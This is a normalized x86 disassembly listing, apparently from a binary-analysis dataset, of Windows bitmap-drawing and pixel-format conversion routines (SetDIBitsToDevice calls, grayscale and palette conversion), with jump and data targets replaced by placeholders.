lea ecx [ ebp + 0x29 ]
cmp ax 0x8
je r-xdata
mov ecx eax
sub ecx [ esp + 0x950 ]
sub ecx edi
mov ecx [ esp + 0x950 ]
add ecx eax
add ecx edi
neg ecx
jmp r-xdata
cmp [ ebp + 0x2c ] 0xff00
jne r-xdata
cmp [ ebp + 0x30 ] 0x1f
je r-xdata
cmp eax 0x20000018
jne r-xdata
mov edx [ ebp + 0x438 ]
mov edi esi
and edi 0x1
lea eax [ edi + edx + 0x1 ]
and eax 0xfffffffe
mov ecx ebp
mov [ esp + 0x10 ] eax
mov [ ebp + 0x438 ] eax
mov [ ebp + 0x444 ] edi
mov [ ebp + 0x448 ] 0x0
call sub_435850
mov ecx [ esp + 0x10 ]
mov [ esp + 0x14 ] eax
imul eax [ esp + 0x950 ]
add ebx eax
mov al [ esp + 0x960 ]
and esi 0xfffffffe
push 0x0
test al al
mov eax [ ebp + 0x43c ]
lea esi [ ebx + esi * 2 ]
push edi
je r-xdata
mov edx [ ebp + 0x448 ]
mov eax [ ebp + 0x444 ]
mov ecx [ ebp + 0x43c ]
push edx
mov edx [ ebp + 0x438 ]
push eax
push 0x10000018
push ecx
push edx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov eax [ ebp + 0x448 ]
mov ecx [ ebp + 0x444 ]
mov edx [ ebp + 0x43c ]
push eax
mov eax [ ebp + 0x438 ]
push ecx
push 0x20000008
push edx
push eax
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
cmp eax 0x10000018
jne r-xdata
mov al [ esp + 0x960 ]
test al al
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ ebp + 0x4 ]
imul eax edi
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
jmp r-xdata
mov ebx [ eax + 0xc ]
mov eax [ ebp + 0x4 ]
movzx edx di
imul eax edx
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ebx eax
sar ebx 0x3
add ebx 0x3
and ebx 0xfffffffc
jmp r-xdata
mov ecx ebp
mov [ ebp + 0x440 ] 0x20000008
call sub_439ce0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x924
retn 0x2c
movzx edx [ ecx ]
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x458 ]
test eax eax
je r-xdata
push 0x0
push edx
push ebx
cdq
xor eax edx
sub eax edx
mov edx [ esp + 0x960 ]
push eax
mov eax [ esp + 0x28 ]
push 0x0
push ecx
push esi
push edi
push edx
push 0x0
push 0x0
push eax
call [ SetDIBitsToDevice@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x30 ] 0xff
jne r-xdata
mov [ ebp + 0x10 ] 0x0
jmp r-xdata
mov eax 0x1
mov edx [ ebp + 0x438 ]
mov edi esi
and edi 0x3
add edx edi
mov ecx ebp
mov [ ebp + 0x438 ] edx
mov [ ebp + 0x444 ] edi
mov [ ebp + 0x448 ] 0x0
call sub_435850
mov [ esp + 0x14 ] eax
imul eax [ esp + 0x950 ]
and esi 0xfffffffc
add ebx eax
mov al [ esp + 0x960 ]
lea esi [ esi + esi * 2 ]
add esi ebx
test al al
push 0x0
mov ecx ebp
push edi
je r-xdata
push 0x10000018
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
push 0x20000008
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x924
retn 0x2c
mov eax [ esp + 0x950 ]
mov ebx [ esp + 0x10 ]
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
imul ecx ebx
mov eax esi
cdq
sub eax edx
sar eax 0x1
lea esi [ ecx + eax ]
push 0x0
mov ecx ebp
call sub_435850
mov edx [ ebp + 0x43c ]
mov ecx [ ebp + 0x42c ]
push eax
mov eax [ ebp + 0x438 ]
push ebx
push ebx
push edx
mov edx [ esp + 0x95c ]
push eax
push ecx
mov ecx [ esp + 0x960 ]
lea eax [ esi + edx ]
push eax
add esi ecx
push esi
push edi
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov ecx ebp
call sub_435850
mov ecx [ esp + 0x10 ]
mov edx [ ebp + 0x43c ]
push eax
mov eax [ ebp + 0x438 ]
push ecx
mov ecx [ ebp + 0x42c ]
push edx
push eax
push ecx
push edi
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
cmp eax 0x10000020
je r-xdata
mov al [ esp + 0x960 ]
test al al
jne r-xdata
mov edx [ ebp + 0x438 ]
mov ebx [ ebp + 0x8 ]
mov eax esi
and eax 0x1
add edx eax
mov ecx ebp
mov [ ebp + 0x438 ] edx
mov [ ebp + 0x444 ] eax
and esi 0xfffffffe
mov [ ebp + 0x448 ] 0x0
call sub_435850
test ebx ebx
mov edi eax
jge r-xdata
test cl cl
je r-xdata
mov ecx [ eax + 0xc ]
mov [ esp + 0x14 ] ecx
mov eax [ ebp + 0x4 ]
imul eax edi
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
mov [ esp + 0x14 ] eax
jmp r-xdata
sub ecx [ esp + 0x950 ]
dec ecx
imul ecx eax
mov eax edi
imul eax esi
cdq
and edx 0x7
add eax edx
mov ebx eax
mov eax [ esp + 0x10 ]
add eax ecx
sar ebx 0x3
add ebx eax
mov eax [ ebp + 0x45c ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
neg eax
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x4 ]
imul eax edi
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
neg eax
mov [ esp + 0x14 ] eax
jmp r-xdata
imul ebx [ esp + 0x950 ]
movzx edi di
mov eax edi
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add ecx eax
mov eax [ ebp + 0x45c ]
add ebx ecx
test eax eax
jne r-xdata
movzx edx [ ecx + 0x1 ]
cmp edx eax
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ ebp + 0x42c ] edx
mov [ ebp + 0x450 ] eax
mov [ ebp + 0x44c ] ecx
mov ecx [ ebp + 0x448 ]
mov edx [ ebp + 0x444 ]
mov eax [ ebp + 0x43c ]
push ecx
mov ecx [ ebp + 0x438 ]
push edx
push 0x10000018
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov edx [ ebp + 0x43c ]
mov eax [ ebp + 0x438 ]
push 0x10000018
push edx
push eax
call sub_4397d0
test eax eax
jne r-xdata
mov eax [ ebp + 0x43c ]
push 0x20000008
push eax
mov eax [ ebp + 0x438 ]
push eax
call sub_4397d0
test eax eax
jne r-xdata
push eax
mov ecx ebp
call sub_435850
mov edx [ esp + 0x18 ]
mov ecx [ ebp + 0x438 ]
push eax
mov eax [ ebp + 0x43c ]
push edx
mov edx [ ebp + 0x42c ]
push eax
push ecx
push edx
push esi
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov ecx ebp
call sub_435850
mov edx [ esp + 0x14 ]
mov ecx [ ebp + 0x438 ]
push eax
mov eax [ ebp + 0x43c ]
push edx
mov edx [ ebp + 0x42c ]
push eax
push ecx
push edx
push esi
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov al [ esp + 0x960 ]
test al al
jne r-xdata
cmp eax 0x40000020
jne r-xdata
mov edx [ ebp + 0x438 ]
mov edi [ ebp + 0x8 ]
mov eax esi
and eax 0x3
add edx eax
mov ecx ebp
mov [ ebp + 0x438 ] edx
mov [ ebp + 0x444 ] eax
and esi 0xfffffffc
mov [ ebp + 0x448 ] 0x0
call sub_435850
test edi edi
mov ebx eax
jge r-xdata
test cl cl
je r-xdata
sub ebx [ esp + 0x950 ]
dec ebx
mov ecx ebp
imul edi ebx
call sub_435830
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add edi eax
mov eax [ ebp + 0x42c ]
mov ecx ebp
add edi eax
call sub_435850
mov ebx eax
movzx eax [ ebp + 0xe ]
imul edi [ esp + 0x950 ]
mov ecx [ ebp + 0x42c ]
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add edi eax
add edi ecx
mov ecx ebp
call sub_435850
mov ebx eax
neg ebx
jmp r-xdata
cmp esi edx
je r-xdata
lea eax [ ebp + 0x28 ]
mov edx [ esp + 0x18 ]
xor esi esi
test edx edx
jle r-xdata
inc eax
add ecx 0x4
cmp eax ebx
jl r-xdata
mov ecx ebp
call sub_435850
mov esi [ esp + 0x2c ]
mov edi [ ebp + 0x42c ]
mov ecx eax
imul ecx [ ebp + 0x43c ]
mov eax [ esp + 0x18 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ DeleteDC@IAT ]
mov ecx [ esp + 0x1c ]
push ecx
call [ DeleteObject@IAT ]
jmp r-xdata
push eax
mov ecx ebp
call sub_435850
mov ecx [ ebp + 0x43c ]
mov edx [ ebp + 0x438 ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ ebp + 0x42c ]
push ecx
push edx
push eax
push esi
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov ecx ebp
call sub_435850
mov ecx [ esp + 0x14 ]
mov edx [ ebp + 0x43c ]
push eax
mov eax [ ebp + 0x438 ]
push ecx
mov ecx [ ebp + 0x42c ]
push edx
push eax
push ecx
push esi
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov edi [ ebp + 0x8 ]
xor eax eax
cmp edi eax
mov [ ebp + 0x444 ] eax
mov [ ebp + 0x448 ] eax
mov ecx ebp
jge r-xdata
test cl cl
je r-xdata
sub edi [ esp + 0x950 ]
dec edi
mov ecx ebp
imul ebx edi
call sub_435830
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add ebx eax
mov eax [ ebp + 0x42c ]
mov ecx ebp
add ebx eax
call sub_435850
mov esi eax
movzx eax [ ebp + 0xe ]
imul ebx [ esp + 0x950 ]
mov ecx [ ebp + 0x42c ]
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add ebx eax
add ebx ecx
mov ecx ebp
call sub_435850
mov esi eax
neg esi
jmp r-xdata
mov al [ esp + 0x95c ]
test al al
je r-xdata
mov edx [ ebp + 0x444 ]
mov eax [ ebp + 0x43c ]
mov ecx [ ebp + 0x438 ]
push 0x0
push edx
push 0x20000008
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov al [ esp + 0x960 ]
test al al
mov [ esp + 0x14 ] ebx
je r-xdata
mov eax 0x1
mov ecx edi
shl eax cl
cmp esi eax
mov [ esp + 0x28 ] eax
jne r-xdata
mov al [ esp + 0x960 ]
test al al
jne r-xdata
cmp cl [ eax + 0x2 ]
jne r-xdata
movzx edx [ ecx - 0x1 ]
cmp edx eax
jne r-xdata
mov edx [ ebp + 0x448 ]
mov ebx [ ebp + 0x42c ]
mov esi [ ebp + 0x444 ]
mov cl [ esp + 0x95c ]
mov [ esp + 0x950 ] edx
call sub_435850
sub edi [ esp + 0x950 ]
mov ebx eax
dec edi
mov ecx ebp
imul ebx edi
call sub_435830
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add ebx eax
mov eax [ ebp + 0x42c ]
mov ecx ebp
add ebx eax
call sub_435850
mov esi eax
call sub_435850
mov ecx [ ebp + 0x42c ]
mov ebx eax
movzx eax [ ebp + 0xe ]
imul ebx [ esp + 0x950 ]
imul eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
add ebx eax
add ebx ecx
mov ecx ebp
call sub_435850
mov esi eax
neg esi
jmp r-xdata
mov al [ esp + 0x95c ]
test al al
je r-xdata
call sub_43abf0
test eax eax
je r-xdata
mov al [ esp + 0x960 ]
test al al
je r-xdata
mov ecx [ ebp + 0x444 ]
mov edx [ ebp + 0x43c ]
mov eax [ ebp + 0x438 ]
push 0x0
push ecx
push 0x10000018
push edx
push eax
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov ecx ebp
call sub_435850
mov edx [ ebp + 0x43c ]
mov esi [ ebp + 0x438 ]
lea ecx [ edx - 0x1 ]
imul ecx eax
add ecx [ ebp + 0x42c ]
test edx edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] esi
jle r-xdata
xor esi esi
lea eax [ ebp + 0x2a ]
jmp r-xdata
xor eax eax
lea esi [ ebp + 0x28 ]
lea ebx [ ebx ]
mov edx [ ebp + 0x444 ]
mov eax [ ebp + 0x43c ]
mov ecx [ ebp + 0x438 ]
push 0x0
push edx
push 0x10000018
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
inc esi
add eax 0x4
cmp esi edx
jl r-xdata
call sub_43abf0
test eax eax
je r-xdata
mov al [ esp + 0x960 ]
test al al
je r-xdata
mov ecx ebp
call sub_439ce0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x924
retn 0x2c
mov ecx [ ebp + 0x448 ]
mov edx [ ebp + 0x444 ]
mov eax [ ebp + 0x43c ]
push ecx
mov ecx [ ebp + 0x438 ]
push edx
push 0x20000008
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov ecx ebp
call sub_435850
mov edx [ ebp + 0x43c ]
mov esi eax
mov eax [ ebp + 0x438 ]
lea ecx [ edx - 0x1 ]
imul ecx esi
mov [ esp + 0x20 ] esi
add ecx [ ebp + 0x42c ]
test edx edx
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
inc ecx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x24 ] edx
movzx edx [ eax - 0x2 ]
movzx ecx [ eax - 0x1 ]
imul edx edx 0x1d2f
imul ecx ecx 0x9646
add edx ecx
movzx ecx [ eax ]
imul ecx ecx 0x4c8b
lea edx [ edx + ecx + 0x8000 ]
sar edx 0x10
mov [ esp + esi + 0x34 ] dl
movzx ecx [ eax + 0x4 ]
movzx edx [ eax + 0x2 ]
imul ecx ecx 0x4c8b
imul edx edx 0x1d2f
add ecx edx
movzx edx [ eax + 0x3 ]
imul edx edx 0x9646
lea ecx [ ecx + edx + 0x8000 ]
movzx edx [ eax + 0x8 ]
sar ecx 0x10
imul edx edx 0x4c8b
mov [ esp + esi + 0x35 ] cl
movzx ecx [ eax + 0x6 ]
imul ecx ecx 0x1d2f
add edx ecx
movzx ecx [ eax + 0x7 ]
imul ecx ecx 0x9646
lea edx [ edx + ecx + 0x8000 ]
movzx ecx [ eax + 0xc ]
sar edx 0x10
imul ecx ecx 0x4c8b
mov [ esp + esi + 0x36 ] dl
movzx edx [ eax + 0xa ]
imul edx edx 0x1d2f
add ecx edx
movzx edx [ eax + 0xb ]
imul edx edx 0x9646
lea ecx [ ecx + edx + 0x8000 ]
movzx edx [ eax + 0x10 ]
sar ecx 0x10
imul edx edx 0x4c8b
mov [ esp + esi + 0x37 ] cl
movzx ecx [ eax + 0xe ]
imul ecx ecx 0x1d2f
add edx ecx
movzx ecx [ eax + 0xf ]
imul ecx ecx 0x9646
lea edx [ edx + ecx + 0x8000 ]
movzx ecx [ eax + 0x14 ]
sar edx 0x10
imul ecx ecx 0x4c8b
mov [ esp + esi + 0x38 ] dl
movzx edx [ eax + 0x12 ]
imul edx edx 0x1d2f
add ecx edx
movzx edx [ eax + 0x13 ]
imul edx edx 0x9646
lea ecx [ ecx + edx + 0x8000 ]
movzx edx [ eax + 0x18 ]
sar ecx 0x10
imul edx edx 0x4c8b
mov [ esp + esi + 0x39 ] cl
movzx ecx [ eax + 0x16 ]
imul ecx ecx 0x1d2f
add edx ecx
movzx ecx [ eax + 0x17 ]
imul ecx ecx 0x9646
lea edx [ edx + ecx + 0x8000 ]
movzx ecx [ eax + 0x1c ]
sar edx 0x10
imul ecx ecx 0x4c8b
mov [ esp + esi + 0x3a ] dl
movzx edx [ eax + 0x1a ]
imul edx edx 0x1d2f
add ecx edx
movzx edx [ eax + 0x1b ]
imul edx edx 0x9646
lea ecx [ ecx + edx + 0x8000 ]
sar ecx 0x10
mov [ esp + esi + 0x3b ] cl
add esi 0x8
add eax 0x20
cmp esi 0x100
jl r-xdata
mov cl [ esi ]
mov [ esp + eax + 0x34 ] cl
inc eax
add esi 0x4
cmp eax 0x100
jl r-xdata
jmp r-xdata
mov eax [ ebp + 0x45c ]
test eax eax
jne r-xdata
mov cl [ eax ]
cmp cl [ eax + 0x1 ]
jne r-xdata
mov eax [ ebp + 0x448 ]
mov ecx [ ebp + 0x444 ]
mov edx [ ebp + 0x43c ]
push eax
mov eax [ ebp + 0x438 ]
push ecx
push 0x20000008
push edx
push eax
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov ecx ebp
call sub_435850
mov ecx [ ebp + 0x43c ]
mov edx eax
neg edx
push edx
mov edx [ ebp + 0x438 ]
neg esi
push esi
mov esi [ ebp + 0x42c ]
push ecx
dec ecx
imul ecx eax
push edx
add ecx esi
push ecx
push ebx
call [ rw-data ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
lea ebp [ ecx + 0x2 ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x24 ]
sub ecx eax
sub edi ebx
dec edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x24 ] edx
jne r-xdata
dec esi
shr esi 0x1
mov edx ecx
mov ebp edi
inc esi
mov edx [ ebp + 0x444 ]
mov eax [ ebp + 0x43c ]
mov ecx [ ebp + 0x438 ]
push 0x0
push edx
push 0x20000008
push eax
push ecx
mov ecx ebp
call sub_4397d0
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ esp + 0x20 ] eax
mov ecx eax
movzx edx [ ebp + 0xe ]
mov eax [ ebp + 0x4 ]
imul eax edx
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ecx eax
sar ecx 0x3
add ecx 0x3
and ecx 0xfffffffc
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov ecx ebp
call sub_435850
mov ecx [ ebp + 0x43c ]
mov edx eax
neg edx
push edx
mov edx [ ebp + 0x438 ]
neg esi
push esi
mov esi [ ebp + 0x42c ]
push ecx
dec ecx
imul ecx eax
push edx
add ecx esi
push ecx
push ebx
call [ rw-data ]
mov esi [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
sub ebp esi
sub edi ebx
dec ecx
mov [ esp + 0x10 ] ecx
jne r-xdata
mov edx ebp
lea ecx [ ecx ]
test esi esi
jle r-xdata
mov ecx [ ebp ]
mov eax ecx
shr eax 0x5
and eax 0x1f
imul eax eax 0x4b22d
mov ebx ecx
shr ebx 0xa
and ebx 0x1f
imul ebx ebx 0x2645a
add eax ebx
mov ebx ecx
and ebx 0x1f
imul ebx ebx 0xe979
add eax ebx
shr eax 0x10
mov [ edx - 0x1 ] al
mov eax ecx
shr eax 0x15
mov ebx ecx
and eax 0x1f
shr ebx 0x10
imul eax eax 0x4b22d
shr ecx 0x1a
and ebx 0x1f
imul ebx ebx 0xe979
and ecx 0x1f
imul ecx ecx 0x2645a
add eax ebx
add eax ecx
shr eax 0x10
mov [ edx ] al
add ebp 0x4
add edx 0x2
dec esi
jne r-xdata
mov ebx [ esp + 0x14 ]
mov esi [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
mov eax [ ebp + 0x45c ]
test eax eax
jne r-xdata
mov esi 0x1
mov ecx edi
shl esi cl
dec esi
mov [ esp + 0x28 ] esi
mov esi 0x8
sub esi edi
test edx edx
mov [ esp + 0x30 ] esi
jle r-xdata
test edx edx
jle r-xdata
mov edx [ ebp + 0x43c ]
mov eax [ ebp + 0x438 ]
lea esi [ edx - 0x1 ]
imul esi ecx
add esi [ ebp + 0x42c ]
cmp edi 0x8
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] esi
jne r-xdata
xor esi esi
test eax eax
jle r-xdata
xor ecx ecx
mov cx [ edi + esi * 2 ]
mov bl cl
shl bl 0x3
mov [ edx - 0x2 ] bl
add edx 0x3
mov ebx ecx
shr ebx 0x2
shr ecx 0x7
and bl 0xf8
and cl 0xf8
mov [ edx - 0x4 ] bl
mov [ edx - 0x3 ] cl
inc esi
cmp esi eax
jl r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x20 ] eax
mov ecx eax
movzx edx [ ebp + 0xe ]
mov eax [ ebp + 0x4 ]
imul eax edx
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ecx eax
sar ecx 0x3
add ecx 0x3
and ecx 0xfffffffc
mov [ esp + 0x20 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov [ esp + 0x10 ] edx
jmp r-xdata
mov [ esp + 0x18 ] edx
cmp edi 0x1
jne r-xdata
test esi esi
jle r-xdata
mov esi [ ebp + 0x43c ]
mov edx [ ebp + 0x438 ]
lea eax [ esi - 0x1 ]
imul eax ecx
add eax [ ebp + 0x42c ]
cmp edi 0x8
mov [ esp + 0x1c ] edx
mov [ esp + 0x18 ] eax
jne r-xdata
xor edx edx
test eax eax
jle r-xdata
mov edi [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
sub esi edi
sub ebx edx
dec ecx
mov [ esp + 0x18 ] ecx
jne r-xdata
mov edx esi
lea esp [ esp ]
mov ebp [ esp + 0x28 ]
mov ecx 0x8
sub ecx edi
dec ebp
test esi esi
mov [ esp + 0x28 ] ecx
jle r-xdata
xor ecx ecx
nop
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
sub esi edx
sub ebx ecx
dec eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
mov [ esp + 0x24 ] ecx
xor ecx ecx
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
movzx edi [ ecx + ebx ]
mov edi [ ebp + edi * 4 + 0x28 ]
mov [ edx ] edi
inc ecx
add edx 0x3
cmp ecx eax
jl r-xdata
mov [ esp + 0x10 ] esi
mov edx ecx
sar edx 0x7
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x134 ] dl
mov edx ecx
sar edx 0x6
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x135 ] dl
mov edx ecx
sar edx 0x5
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x136 ] dl
mov edx ecx
sar edx 0x4
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x137 ] dl
mov edx ecx
sar edx 0x3
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x138 ] dl
mov edx ecx
sar edx 0x2
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x139 ] dl
mov edx ecx
sar edx 0x1
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x13a ] dl
mov edx ecx
and edx 0x1
mov dl [ esp + edx + 0x34 ]
mov [ esp + ecx * 8 + 0x13b ] dl
inc ecx
cmp ecx 0x100
jl r-xdata
test esi esi
jle r-xdata
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
sub eax ecx
sub ebx edi
dec esi
mov [ esp + 0x10 ] esi
jne r-xdata
mov edi ebx
mov esi eax
sub edi eax
mov ebp edx
mov eax [ esp + 0x1c ]
nop
xor ecx ecx
mov cl [ esp + 0x30 ]
mov al dl
and al 0x7
sub cl al
mov eax edx
shr eax 0x3
movzx eax [ eax + ebx ]
shr eax cl
mov ecx [ esp + 0x28 ]
add edx edi
add esi 0x3
and eax ecx
mov ecx [ ebp + eax * 4 + 0x28 ]
mov eax [ esp + 0x24 ]
mov [ esi - 0x3 ] ecx
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
sub eax esi
sub ebx edx
dec ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] ecx
jne r-xdata
lea ecx [ ecx ]
lea ebp [ eax + 0x1 ]
mov [ esp + 0x10 ] esi
test edx edx
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
movzx edx [ edi + esi ]
mov dl [ esp + edx + 0x34 ]
mov [ esi ] dl
inc esi
dec ebp
jne r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x1c ]
xor edx edx
xor esi esi
test ecx ecx
jle r-xdata
xor ecx ecx
mov cl [ esp + 0x28 ]
mov al dl
and al 0x7
sub cl al
mov eax edx
shr eax 0x3
movzx eax [ eax + ebx ]
shr eax cl
add edx edi
and eax ebp
mov cl [ esp + eax + 0x34 ]
mov eax [ esp + 0x18 ]
mov [ esi + eax ] cl
mov ecx [ esp + 0x1c ]
inc esi
cmp esi ecx
jl r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
sub ebp edx
sub ebx ecx
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
lea esi [ eax - 0x1 ]
shr esi 0x3
mov edx ebp
inc esi
mov eax [ esp + 0x1c ]
test eax eax
mov edi ebx
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
movzx ecx [ edi ]
shl ecx 0x3
mov al [ esp + ecx + 0x134 ]
mov [ edx - 0x1 ] al
mov al [ esp + ecx + 0x135 ]
mov [ edx ] al
mov al [ esp + ecx + 0x136 ]
mov [ edx + 0x1 ] al
mov al [ esp + ecx + 0x137 ]
mov [ edx + 0x2 ] al
mov al [ esp + ecx + 0x138 ]
mov [ edx + 0x3 ] al
mov al [ esp + ecx + 0x139 ]
mov [ edx + 0x4 ] al
mov al [ esp + ecx + 0x13a ]
mov cl [ esp + ecx + 0x13b ]
mov [ edx + 0x5 ] al
mov [ edx + 0x6 ] cl
inc edi
add edx 0x8
dec esi
jne r-xdata
sub_43ce20
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c025b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4a4
push ebx
push ebp
push esi
push edi
mov ebx ecx
call sub_439440
cmp [ esp + 0x4e8 ] 0x0
mov ebp [ esp + 0x4c8 ]
mov edx [ esp + 0x4d0 ]
mov eax [ esp + 0x4dc ]
mov ecx 0x10a
mov esi ebp
mov edi ebx
[ edi ] [ esi ]
mov edi [ esp + 0x4d8 ]
mov ecx [ esp + 0x4cc ]
mov esi [ esp + 0x4c4 ]
mov [ ebx + 0x430 ] edx
mov edx [ esp + 0x4d4 ]
mov [ ebx + 0x434 ] edx
mov edx [ esp + 0x4e0 ]
mov [ ebx + 0x438 ] edx
mov edx [ esp + 0x4e4 ]
mov [ ebx + 0x444 ] edi
mov [ ebx + 0x448 ] eax
mov [ ebx + 0x42c ] ecx
mov [ ebx + 0x43c ] edx
mov [ ebx + 0x440 ] esi
mov [ ebx + 0x454 ] 0x1
jne r-xdata
cmp esi 0x20000010
je r-xdata
cmp esi 0x10000001
je r-xdata
xor eax eax
call sub_43abf0
test eax eax
jne r-xdata
push 0x0
push 0x1
push edx
mov edx [ esp + 0x4ec ]
push edx
mov edx [ esp + 0x4e0 ]
push eax
mov eax [ esp + 0x4e8 ]
push edi
push eax
push edx
push ecx
push ebp
push esi
mov ecx ebx
call sub_43ba10
test eax eax
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
lea ecx [ esp + 0x24 ]
call sub_439410
mov eax [ ebx + 0x438 ]
mov ecx [ ebx + 0x43c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x440 ]
cmp eax 0x10000001
mov [ esp + 0x4bc ] 0x0
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x4b4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4b0
retn 0x28
jmp r-xdata
mov ecx [ esp + 0x4e4 ]
mov edx [ esp + 0x4e0 ]
mov eax [ esp + 0x4dc ]
push 0x0
push 0x1
push ecx
mov ecx [ esp + 0x4e0 ]
push edx
mov edx [ esp + 0x4e0 ]
push eax
mov eax [ esp + 0x4e0 ]
push edi
push ecx
push edx
push eax
push ebp
push esi
lea ecx [ esp + 0x50 ]
call sub_43ba10
mov esi eax
test esi esi
lea ecx [ esp + 0x24 ]
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x450 ]
xor eax eax
mov edi ebp
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
call sub_435850
mov esi eax
mov eax [ esp + 0x2c ]
test eax eax
jle r-xdata
call sub_43a1f0
mov eax esi
